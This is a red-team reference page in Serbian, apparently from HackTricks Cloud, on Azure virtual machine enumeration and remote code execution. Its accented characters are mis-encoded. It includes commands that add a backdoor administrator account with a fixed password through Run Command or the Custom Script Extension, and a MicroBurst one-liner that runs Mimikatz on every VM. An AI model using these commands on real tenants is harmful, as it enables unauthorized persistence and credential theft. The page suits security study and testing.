# Az - Virtuelne maÅ¡ine i mreÅ¾a

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

[Iz dokumenata:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuelne maÅ¡ine su jedan od nekoliko tipova [resursa za raÄunanje na zahtev, skalabilnih](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) koje Azure nudi. ObiÄno birate virtuelnu maÅ¡inu kada vam je potrebna veÄ‡a kontrola nad okruÅ¾enjem za raÄunanje nego Å¡to to nude druge opcije. Ovaj Älanak vam daje informacije o tome Å¡ta treba da razmotrite pre nego Å¡to kreirate virtuelnu maÅ¡inu, kako je kreirati i kako je upravljati.

## Azure MreÅ¾ne informacije

Azure mreÅ¾e sadrÅ¾e **razliÄite entitete i naÄine za konfiguraciju.** MoÅ¾ete pronaÄ‡i kratke **opisne**, **primere** i **komande za enumeraciju** razliÄitih Azure mreÅ¾nih entiteta u:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** nudi sigurno, potpuno upravljano RDP (Remote Desktop Protocol) i SSH (Secure Shell) reÅ¡enje za pristup preko SSL-a putem Azure portala. Integrisan je unutar Azure Virtuelne MreÅ¾e, omoguÄ‡avajuÄ‡i RDP i SSH povezivanje sa VM-ovima koristeÄ‡i privatne IP adrese, izbegavajuÄ‡i potrebu za javnim IP adresama. Ovo ga Äini sigurnijom, praktiÄnijom alternativom tradicionalnim metodama koje ukljuÄuju dodeljivanje javnih IP adresa i konfiguraciju NSG pravila za pristup VM-ovima. Programeri i IT osoblje mogu sigurno pristupiti VM-ovima sa Azure portala koristeÄ‡i svoje web pretraÅ¾ivaÄe, pojednostavljujuÄ‡i proces za razvojna i testna okruÅ¾enja.

Da biste naveli sve Azure Bastion hostove u vaÅ¡oj pretplati, moÅ¾ete koristiti sledeÄ‡u komandu:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Enumeracija
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Pokrenite komande u VM-u**

### **AAD prijava u VM-u**

MoguÄ‡e je omoguÄ‡iti pristup korisnicima koji su autentifikovani putem AzureAD. Na primer, pokuÅ¡avajuÄ‡i da pristupite **linux VM-u**: `ssh username@azure-corp.com@1.1.1.1` (vaÅ¾no je **koristiti email** sa azurecorp koji je koriÅ¡Ä‡en prilikom pokuÅ¡aja prijave) mogli biste dobiti greÅ¡ku kao: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Samo **pratite te instrukcije** odlaskom na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i unosom koda, koristite email i lozinku kao akreditive i moÄ‡i Ä‡ete da se poveÅ¾ete putem SSH (ako taj korisnik ima dovoljno dozvola za to: `Virtual Machine Administrator Login` ili `Virtual Machine User Login` uloga).

### **Pokreni Komandu**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Pokreni prilagoÄ‘enu skriptnu ekstenziju**

Azure virtuelne maÅ¡ine (VM) ekstenzije su **male aplikacije** koje pruÅ¾aju konfiguraciju i automatizaciju **zadataka** nakon implementacije na **Azure VM-ovima**. Na primer, ako virtuelna maÅ¡ina zahteva instalaciju softvera, antivirusnu zaÅ¡titu ili moguÄ‡nost pokretanja skripte unutar nje, moÅ¾ete koristiti VM ekstenziju.

Stoga, ako imate pristup za pisanje, moÅ¾ete izvrÅ¡iti proizvoljan kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) je PowerShell alat sliÄan Ansible-u, koji se koristi za postavljanje hosta putem koda. DSC se integriÅ¡e sa Azure-om, omoguÄ‡avajuÄ‡i upload specifiÄnih konfiguracionih fajlova. Ovi fajlovi moraju da se pridrÅ¾avaju stroge sintakse. ZnaÄajno je da DSC ekstenzija u Azure-u moÅ¾e izvrÅ¡avati komande iz fajlova koji ispunjavaju odreÄ‘ene kriterijume formatiranja, Äak i ako sintaksa nije ispravna prema DSC standardima, kao Å¡to je prikazano na priloÅ¾enoj slici.

IzvrÅ¡enje ovih komandi olakÅ¡ava [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) funkcija u Az PowerShell-u. Zahtevi ukljuÄuju **.PS1** fajl sa definisanom funkcijom, a fajl mora biti upakovan u **.zip** fajl. Iako sintaksa moÅ¾da nije taÄna za DSC, kod Ä‡e se i dalje izvrÅ¡iti. MeÄ‘utim, ekstenzija Ä‡e oznaÄiti status izvrÅ¡enja kao "neuspeh," i nijedan izlaz iz komande neÄ‡e biti vidljiv zbog toga Å¡to je status prepisan porukom o neuspehu.

### VM Application Definitions

VM Application Definitions omoguÄ‡avaju ponovljivo postavljanje verzionisanih aplikacija na Azure VM. Ovaj resurs podrÅ¾ava postavljanje i aÅ¾uriranje aplikacija Å¡irom VMs. Da bi se ovo postavilo, potrebno je nekoliko koraka, ukljuÄujuÄ‡i komande kao Å¡to su **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** u Az PowerShell-u.

IzvrÅ¡enje aplikacija ili komandi putem ove metode ukljuÄuje **"VMAppExtension,"** koja se automatski instalira kada se aplikacija primeni na VM. Ekstenzija preuzima fajl sa specificiranog URI i imenuje ga taÄno kao aplikaciju, bez ekstenzije. Da bi se fajl ispravno izvrÅ¡io, polje "ManageActions" u REST API pozivu mora biti konfigurisano da preimenuje fajl sa odgovarajuÄ‡om ekstenzijom. Postavljanje ove metode, kada se zavrÅ¡i, Ä‡e liÄiti na strukturu prikazanu na priloÅ¾enoj slici.

MeÄ‘utim, ova metoda izvrÅ¡enja je relativno spora, traje oko 3-4 minuta da izvrÅ¡i aplikaciju ili komandu. Fajlovi povezani sa ovim procesom se Äuvaju u specifiÄnim direktorijumima (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` za kopiju aplikacije i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` za status izvrÅ¡enja).

Obe tehnike pruÅ¾aju jedinstvene naÄine za izvrÅ¡avanje komandi i postavljanje aplikacija u Azure okruÅ¾enjima, svaka sa svojim skupom zahteva, koraka i razmatranja.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) su funkcija u Azure-u koja omoguÄ‡ava izvrÅ¡avanje Runbook-a, konfiguranih u Automation Account-u, na Azure Virtual Machine (VM) koja je deo odreÄ‘enog HWG-a. Ovo izvrÅ¡enje se olakÅ¡ava putem ekstenzije instalirane na VM-u, koja postavlja Runbook kod na VM. ZnaÄajan aspekt ovog procesa je da stvarne akreditive nisu faktor u izvrÅ¡enju jer se kod izvrÅ¡ava sa poviÅ¡enim privilegijama, specifiÄno kao **SYSTEM** ili root, kao Å¡to je ilustrovano na priloÅ¾enoj slici.

KljuÄna informacija za one koji koriste Windows 10 VMs je potreba da se specificira verzija PowerShell-a za Runbook. Trebalo bi da se postavi da se izvrÅ¡ava kao PowerShell Verzija 5.1 umesto 7.1. Ovaj zahtev proistiÄe iz Äinjenice da PowerShell 7.1 nije instaliran po default-u na ovim VMs, Å¡to dovodi do neuspeha u izvrÅ¡enju skripte ako je verzija 7.1 specificirana.

Ova funkcija Azure-a nudi robustan metod za automatizaciju i upravljanje zadacima Å¡irom hibridnih okruÅ¾enja, omoguÄ‡avajuÄ‡i centralizovano upravljanje i izvrÅ¡enje zadataka na Azure VMs.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
